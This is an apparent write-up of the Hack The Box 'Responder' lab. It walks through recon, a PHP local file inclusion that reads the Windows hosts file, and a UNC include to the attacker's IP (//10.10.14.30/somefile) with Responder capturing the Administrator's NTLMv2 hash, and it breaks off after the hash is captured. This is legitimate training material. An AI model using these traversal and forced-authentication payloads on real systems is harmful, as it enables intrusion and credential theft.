</span></span></code></pre></div><h2 id=task-1><strong>TASK 1</strong><a hidden class=anchor aria-hidden=true href=#task-1>#</a></h2><p><strong>Question</strong>: <em>When visiting the web service using the IP address, what is the domain that we are being redirected to?</em></p><p>As always, we <strong>start</strong> our journey with a quick <strong>recon</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$nmap</span> -p- -sV <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>Starting Nmap 7.93 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2023-05-07 13:38 BST
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.129.95.234
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.014s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE VERSION
</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.52 <span class=o>((</span>Win64<span class=o>)</span> OpenSSL/1.1.1m PHP/8.1.1<span class=o>)</span>
</span></span><span class=line><span class=cl>5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 <span class=o>(</span>SSDP/UPnP<span class=o>)</span>
</span></span><span class=line><span class=cl>Service Info: OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 183.28 seconds
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>As we can see, only <strong>two</strong> ports are reported <strong>open</strong> on our <strong>target</strong> machine. One way to check out the reported web server is by using our <strong>browser</strong> and inputting our <strong>target</strong> machine&rsquo;s <strong>IP</strong>.</p><p>The first thing we might notice is our browser being <strong>redirected</strong> to a web page called <em>unika.htb</em>.</p><p>The second one might be, that trying to <strong>load up</strong> - <em>unika.htb</em> - in our <strong>browser</strong> does not work and our browser <strong>indicates</strong> a <em>Server Not Found</em> error.</p><p>To work around this, we add the following lines to our <strong>host configuration file</strong>. For the <strong>pwnbox</strong> (parrot os - debian base), ours is <strong>sitting</strong> at <em>/etc/hosts</em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># mapping htb_starting-point_tier-1_responder&#39;s IP to hostname</span>
</span></span><span class=line><span class=cl>&lt;target-ip&gt; unika.htb
</span></span></code></pre></div><p>Once the <strong>host name resolution</strong> is fixed, opening the webpage in our browser will <strong>work</strong> as usual.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/responder/webpage.png alt=unika-webpage title=unika-webpage></p><blockquote><p>unika.htb</p></blockquote><h2 id=task-2><strong>TASK 2</strong><a hidden class=anchor aria-hidden=true href=#task-2>#</a></h2><p><strong>Question</strong>: <em>Which scripting language is being used on the server to generate webpages?</em></p><p>Still in our initial <strong>recon</strong> phase, we could use a <strong>tool</strong> called <em><strong>whatweb</strong></em> to solve this task.</p><p>It is always a <strong>good idea</strong> to first we check out the tool&rsquo;s <strong>man page</strong> (<em>man whatweb</em>) before using it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>WHATWEB(1)                        General Commands Manual                        WHATWEB(1)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NAME
</span></span><span class=line><span class=cl>       WhatWeb - Next generation Web scanner. Identify technologies used by websites.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SYNOPSIS
</span></span><span class=line><span class=cl>       whatweb [options] &lt;URLs&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>DESCRIPTION
</span></span><span class=line><span class=cl>       WhatWeb identifies websites. It&#39;s goal is to answer the question, &#34;What is that Web‐
</span></span><span class=line><span class=cl>       site?&#34;. WhatWeb recognises web technologies  including  content  management  systems
</span></span><span class=line><span class=cl>       (CMS),  blogging  platforms, statistic/analytics packages, JavaScript libraries, web
</span></span><span class=line><span class=cl>       servers, and embedded devices. WhatWeb has over  1800  plugins,  each  to  recognise
</span></span><span class=line><span class=cl>       something  different.  WhatWeb also identifies version numbers, email addresses, ac‐
</span></span><span class=line><span class=cl>       count ID&#39;s, web framework modules, SQL errors, and more.
</span></span><span class=line><span class=cl>...
</span></span></code></pre></div><p>Scanning our <strong>target</strong> provides us not only with the current task&rsquo;s answer, but it also <strong>highlights</strong> that there is a <strong>redirection</strong> set in place.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-ktydnkgvcj<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$whatweb</span> <span class=nv>$rhost</span> 
</span></span><span class=line><span class=cl>http://10.129.163.153 <span class=o>[</span><span class=m>200</span> OK<span class=o>]</span> Apache<span class=o>[</span>2.4.52<span class=o>]</span>, Country<span class=o>[</span>RESERVED<span class=o>][</span>ZZ<span class=o>]</span>, HTTPServer<span class=o>[</span>Apache/2.4.52 <span class=o>(</span>Win64<span class=o>)</span> OpenSSL/1.1.1m PHP/8.1.1<span class=o>]</span>, IP<span class=o>[</span>10.129.163.153<span class=o>]</span>, Meta-Refresh-Redirect<span class=o>[</span>http://unika.htb/<span class=o>]</span>, OpenSSL<span class=o>[</span>1.1.1m<span class=o>]</span>, PHP<span class=o>[</span>8.1.1<span class=o>]</span>, X-Powered-By<span class=o>[</span>PHP/8.1.1<span class=o>]</span>
</span></span><span class=line><span class=cl>ERROR Opening: http://unika.htb/ - no address <span class=k>for</span> unika.htb
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-ktydnkgvcj<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>On the same note, running <em><strong>gobuster</strong></em> might reveal some interesting pages&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$gobuster</span> dir -u http://unika.htb/ -w /usr/share/wordlists/dirb/common.txt 
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.1.0
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://unika.htb/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirb/common.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.1.0
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/07 14:23:53 Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.hta                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htpasswd            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/.htaccess            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/aux                  <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/cgi-bin/             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/com2                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/com1                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/com3                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/con                  <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>
</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 328<span class=o>]</span> <span class=o>[</span>--&gt; http://unika.htb/css/<span class=o>]</span>
</span></span><span class=line><span class=cl>/img                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 328<span class=o>]</span> <span class=o>[</span>--&gt; http://unika.htb/img/<span class=o>]</span>
</span></span><span class=line><span class=cl>/inc                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 328<span class=o>]</span> <span class=o>[</span>--&gt; http://unika.htb/inc/<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 46453<span class=o>]</span>                          
</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 327<span class=o>]</span> <span class=o>[</span>--&gt; http://unika.htb/js/<span class=o>]</span> 
</span></span><span class=line><span class=cl>/licenses             <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 417<span class=o>]</span>                            
</span></span><span class=line><span class=cl>/lpt1                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>                            
</span></span><span class=line><span class=cl>/lpt2                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>                            
</span></span><span class=line><span class=cl>/examples             <span class=o>(</span>Status: 503<span class=o>)</span> <span class=o>[</span>Size: 398<span class=o>]</span>                            
</span></span><span class=line><span class=cl>/nul                  <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>                            
</span></span><span class=line><span class=cl>/phpmyadmin           <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 417<span class=o>]</span>                            
</span></span><span class=line><span class=cl>/prn                  <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 298<span class=o>]</span>                            
</span></span><span class=line><span class=cl>/server-info          <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 417<span class=o>]</span>                            
</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 417<span class=o>]</span>                            
</span></span><span class=line><span class=cl>/webalizer            <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 417<span class=o>]</span>                            
</span></span><span class=line><span class=cl>                                                                           
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>2023/05/07 14:24:00 <span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Well, nothing really stands out at first look, so we continue with our <strong>recon</strong>.</p><blockquote><p>php</p></blockquote><h2 id=task-3><strong>TASK 3</strong><a hidden class=anchor aria-hidden=true href=#task-3>#</a></h2><p><strong>Question</strong>: <em>What is the name of the URL parameter which is used to load different language versions of the webpage?</em></p><p>Heading over to our <strong>target's</strong> website and looking around a bit, we might notice that trying out the <strong>different langues</strong> results some interesting changes in the <strong>url</strong>.</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/responder/webpage_url_change.png alt=unika-url-change title=unika-url-change></p><blockquote><p>page</p></blockquote><h2 id=task-4><strong>TASK 4</strong><a hidden class=anchor aria-hidden=true href=#task-4>#</a></h2><p><strong>Question</strong>: <em>Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability:</em></p><ul><li>&ldquo;french.html&rdquo;</li><li>&ldquo;//10.10.14.6/somefile&rdquo;</li><li>&ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;</li><li>&ldquo;minikatz.exe&rdquo;</li></ul><p>We can <strong>check</strong> if the webpage <strong>location</strong> we found is truly <strong>vulnerable</strong> against an <strong>LFI</strong> by trying to <strong>access</strong> one of the <strong>local files</strong> on the target that is <strong>serving</strong> the webpage.</p><p>But for that, we first need to know where exactly on the target we are located at. So we first try to <strong>access</strong> the <strong>current directory</strong> (<em>./</em>) and hope that the <strong>error</strong> messages may <strong>leak</strong> some <strong>location data</strong>.</p><p>We could do this by either continue using our browser and modifying our <strong>url</strong> to <em><a href="http://unika.htb/index.php?page=./">http://unika.htb/index.php?page=./</a></em>, or by using <em><strong>curl</strong></em> (check out it&rsquo;s <strong>man page</strong> for further info).</p><p><img loading=lazy src=/walkthroughs/htb/starting-point/tier_1/responder/webpage-lfi.png alt=unika-lfi-current-dir title=unika-lfi-current-dir></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$curl</span> http://unika.htb/index.php?page<span class=o>=</span>./
</span></span><span class=line><span class=cl>&lt;br /&gt;
</span></span><span class=line><span class=cl>&lt;b&gt;Warning&lt;/b&gt;:  include<span class=o>(</span>C:<span class=se>\x</span>ampp<span class=se>\h</span>tdocs<span class=o>)</span>: Failed to open stream: Permission denied in &lt;b&gt;C:<span class=se>\x</span>ampp<span class=se>\h</span>tdocs<span class=se>\i</span>ndex.php&lt;/b&gt; on line &lt;b&gt;11&lt;/b&gt;&lt;br /&gt;
</span></span><span class=line><span class=cl>&lt;br /&gt;
</span></span><span class=line><span class=cl>&lt;b&gt;Warning&lt;/b&gt;:  include<span class=o>()</span>: Failed opening <span class=s1>&#39;./&#39;</span> <span class=k>for</span> inclusion <span class=o>(</span><span class=nv>include_path</span><span class=o>=</span><span class=s1>&#39;\xampp\php\PEAR&#39;</span><span class=o>)</span> in &lt;b&gt;C:<span class=se>\x</span>ampp<span class=se>\h</span>tdocs<span class=se>\i</span>ndex.php&lt;/b&gt; on line &lt;b&gt;11&lt;/b&gt;&lt;br /&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Looking at the output, we can <strong>guess</strong> that the <strong>file</strong> that we actually tried to <strong>access</strong> must be located somewhere in the <em>C:\xampp\htdocs\.</em> or in the <em>C:\xampp\php\.</em> directory.</p><p>So to <strong>traverse</strong> through the directories and <strong>access</strong> the <strong>host file</strong> on the <strong>target</strong>, we must go (at least) 2 times backwards and then use the host file&rsquo;s <strong>path</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$curl</span> http://unika.htb/index.php?page<span class=o>=</span>../../windows/system32/drivers/etc/hosts
</span></span><span class=line><span class=cl><span class=c1># Copyright (c) 1993-2009 Microsoft Corp.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># This file contains the mappings of IP addresses to host names. Each</span>
</span></span><span class=line><span class=cl><span class=c1># entry should be kept on an individual line. The IP address should</span>
</span></span><span class=line><span class=cl><span class=c1># be placed in the first column followed by the corresponding host name.</span>
</span></span><span class=line><span class=cl><span class=c1># The IP address and the host name should be separated by at least one</span>
</span></span><span class=line><span class=cl><span class=c1># space.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># Additionally, comments (such as these) may be inserted on individual</span>
</span></span><span class=line><span class=cl><span class=c1># lines or following the machine name denoted by a &#39;#&#39; symbol.</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1># For example:</span>
</span></span><span class=line><span class=cl><span class=c1>#</span>
</span></span><span class=line><span class=cl><span class=c1>#      102.54.94.97     rhino.acme.com          # source server</span>
</span></span><span class=line><span class=cl><span class=c1>#       38.25.63.10     x.acme.com              # x client host</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># localhost name resolution is handled within DNS itself.</span>
</span></span><span class=line><span class=cl><span class=c1>#	127.0.0.1       localhost</span>
</span></span><span class=line><span class=cl><span class=c1>#	::1             localhost</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>Great, we just <strong>found</strong> a <strong>LFI vulnerability</strong>.</p><blockquote><p>../../../../../../../../windows/system32/drivers/etc/hosts</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability:</em></p><ul><li>&ldquo;french.html&rdquo;</li><li>&ldquo;//10.10.14.6/somefile&rdquo;</li><li>&ldquo;../../../../../../../../windows/system32/drivers/etc/hosts&rdquo;</li><li>&ldquo;minikatz.exe&rdquo;</li></ul><p>Turning <strong>off</strong> the <em>HTTP</em> toggle in the <em>/usr/share/responder/Responder.conf</em> file should enable us to <em>'host'</em> our <em><strong>responder</strong></em> on port 80.</p><p>Once we <strong>ran</strong> it so that we can start <strong>listening</strong> to <strong>events</strong>, there will be a <strong>welcome message</strong> displaying it&rsquo;s <strong>running configuration</strong>. Importantly, it also contains the <strong>IP address</strong> via it is made <strong>accessible</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$sudo</span> responder -I tun0
</span></span><span class=line><span class=cl>                                         __
</span></span><span class=line><span class=cl>  .----.-----.-----.-----.-----.-----.--<span class=p>|</span>  <span class=p>|</span>.-----.----.
</span></span><span class=line><span class=cl>  <span class=p>|</span>   _<span class=p>|</span>  -__<span class=p>|</span>__ --<span class=p>|</span>  _  <span class=p>|</span>  _  <span class=p>|</span>     <span class=p>|</span>  _  <span class=o>||</span>  -__<span class=p>|</span>   _<span class=p>|</span>
</span></span><span class=line><span class=cl>  <span class=p>|</span>__<span class=p>|</span> <span class=p>|</span>_____<span class=p>|</span>_____<span class=p>|</span>   __<span class=p>|</span>_____<span class=p>|</span>__<span class=p>|</span>__<span class=p>|</span>_____<span class=o>||</span>_____<span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>                   <span class=p>|</span>__<span class=p>|</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>           NBT-NS, LLMNR <span class=p>&amp;</span> MDNS Responder 3.0.6.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  Author: Laurent Gaffie <span class=o>(</span>laurent.gaffie@gmail.com<span class=o>)</span>
</span></span><span class=line><span class=cl>  To <span class=nb>kill</span> this script hit CTRL-C
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Poisoners:
</span></span><span class=line><span class=cl>    LLMNR                      <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    NBT-NS                     <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    DNS/MDNS                   <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Servers:
</span></span><span class=line><span class=cl>    HTTP server                <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    HTTPS server               <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    WPAD proxy                 <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Auth proxy                 <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    SMB server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    Kerberos server            <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    SQL server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    FTP server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    IMAP server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    POP3 server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    SMTP server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    DNS server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    LDAP server                <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    RDP server                 <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    DCE-RPC server             <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>    WinRM server               <span class=o>[</span>ON<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> HTTP Options:
</span></span><span class=line><span class=cl>    Always serving EXE         <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Serving EXE                <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Serving HTML               <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Upstream Proxy             <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Poisoning Options:
</span></span><span class=line><span class=cl>    Analyze Mode               <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Force WPAD auth            <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Force Basic Auth           <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Force LM downgrade         <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>    Fingerprint hosts          <span class=o>[</span>OFF<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Generic Options:
</span></span><span class=line><span class=cl>    Responder NIC              <span class=o>[</span>tun0<span class=o>]</span>
</span></span><span class=line><span class=cl>    Responder IP               <span class=o>[</span>10.10.14.30<span class=o>]</span>
</span></span><span class=line><span class=cl>    Challenge <span class=nb>set</span>              <span class=o>[</span>random<span class=o>]</span>
</span></span><span class=line><span class=cl>    Don<span class=s1>&#39;t Respond To Names     [&#39;</span>ISATAP<span class=err>&#39;</span><span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Current Session Variables:
</span></span><span class=line><span class=cl>    Responder Machine Name     <span class=o>[</span>WIN-MW3EU9AUBEK<span class=o>]</span>
</span></span><span class=line><span class=cl>    Responder Domain Name      <span class=o>[</span>9LC1.LOCAL<span class=o>]</span>
</span></span><span class=line><span class=cl>    Responder DCE-RPC Port     <span class=o>[</span>48718<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Listening <span class=k>for</span> events...
</span></span></code></pre></div><p>We feed this <strong>address</strong> to our target via the <strong>LFI</strong> <strong>vulnerability</strong> we just discovered, so that when our target tries to <strong>include</strong> the file we provided, it will automatically try to <strong>authenticate</strong> against our <em><strong>responder</strong></em>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=nv>$curl</span> http://unika.htb/index.php?page<span class=o>=</span>//10.10.14.30/somefile
</span></span><span class=line><span class=cl>&lt;br /&gt;
</span></span><span class=line><span class=cl>&lt;b&gt;Warning&lt;/b&gt;:  include<span class=o>(</span><span class=se>\\</span>10.10.14.30<span class=se>\S</span>OMEFILE<span class=o>)</span>: Failed to open stream: Permission denied in &lt;b&gt;C:<span class=se>\x</span>ampp<span class=se>\h</span>tdocs<span class=se>\i</span>ndex.php&lt;/b&gt; on line &lt;b&gt;11&lt;/b&gt;&lt;br /&gt;
</span></span><span class=line><span class=cl>&lt;br /&gt;
</span></span><span class=line><span class=cl>&lt;b&gt;Warning&lt;/b&gt;:  include<span class=o>()</span>: Failed opening <span class=s1>&#39;//10.10.14.30/somefile&#39;</span> <span class=k>for</span> inclusion <span class=o>(</span><span class=nv>include_path</span><span class=o>=</span><span class=s1>&#39;\xampp\php\PEAR&#39;</span><span class=o>)</span> in &lt;b&gt;C:<span class=se>\x</span>ampp<span class=se>\h</span>tdocs<span class=se>\i</span>ndex.php&lt;/b&gt; on line &lt;b&gt;11&lt;/b&gt;&lt;br /&gt;
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop/responder<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
</span></span></code></pre></div><p>And since our <em><strong>responder</strong></em> is already <strong>listening</strong>, we will <strong>catch</strong> not only the <strong>username</strong> that our <strong>target</strong> provides, but it&rsquo;s <strong>response</strong> to our <strong>NTLM challenge</strong> too.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Listening <span class=k>for</span> events...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Client   : 10.129.95.234
</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Username : RESPONDER<span class=se>\A</span>dministrator
</span></span><span class=line><span class=cl><span class=o>[</span>SMB<span class=o>]</span> NTLMv2-SSP Hash     : Administrator::RESPONDER:a8750f2f141730ce:206BE3774A31A5055156CDBD66EC79B2:01010000000000000060F0D3FC80D90190C13FA75A83A9BD000000000200080039004C004300310001001E00570049004E002D004D005700330045005500390041005500420045004B0004003400570049004E002D004D005700330045005500390041005500420045004B002E0039004C00430031002E004C004F00430041004C000300140039004C00430031002E004C004F00430041004C000500140039004C00430031002E004C004F00430041004C00070008000060F0D3FC80D901060004000200000008003000300000000000000001000000002000004D6B32FFC31E455834C10B1E7584A0120257353A272A5BE624157BBD172E4B180A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00330030000000000000000000
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Exiting...
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>✗<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-lqivhnlwpy<span class=o>]</span>─<span class=o>[</span>~/Desktop<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ $
